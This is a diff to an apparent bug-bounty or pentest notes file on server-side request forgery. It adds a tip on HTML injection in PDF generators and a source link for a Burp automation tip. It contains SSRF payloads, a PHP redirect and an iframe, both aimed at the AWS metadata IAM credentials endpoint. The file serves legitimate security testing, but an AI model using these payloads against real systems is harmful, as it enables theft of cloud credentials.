@@ -624,11 +624,12 @@ Other tips
   <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
   ```
 - If everything fails, look for assets pointing to internal IPs. You can usually find these via CSP headers, JS files, Github, shodan/censys etc. [[Reference](https://twitter.com/bogdantcaciuc7/status/1561572514295341058)]
+- HTML Injection in PDF generator, try call internal resources with `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" title="SSRF test">`
 - [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
 
 Automate with Burp
 - [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968)
-- [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f) + [AutoRepeater](https://github.com/nccgroup/AutoRepeater)
+- [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f) + [AutoRepeater](https://github.com/nccgroup/AutoRepeater) [[Source](https://twitter.com/Bugcrowd/status/1586058991758675969)]
   ```
   - Type: Request Param Value
   - Match: ^(https?|ftp)://[^\s/$.?#].[^\s]*$
